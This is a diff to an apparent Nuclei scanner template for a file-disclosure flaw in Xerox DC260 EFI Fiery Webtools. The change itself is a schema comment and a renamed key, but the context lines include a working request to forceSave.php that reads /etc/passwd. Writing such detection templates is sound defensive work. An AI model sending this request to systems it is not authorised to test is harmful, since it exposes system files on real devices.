@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: xerox-efi-lfi
 info:
   name: Xerox DC260 EFI Fiery Controller Webtools 2.0 - Arbitrary File Disclosure
@@ -9,7 +10,7 @@ info:
     - https://packetstormsecurity.com/files/145570
     - https://www.exploit-db.com/exploits/43398/
   tags: iot,xerox,disclosure,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wt3/forceSave.php?file=/etc/passwd"
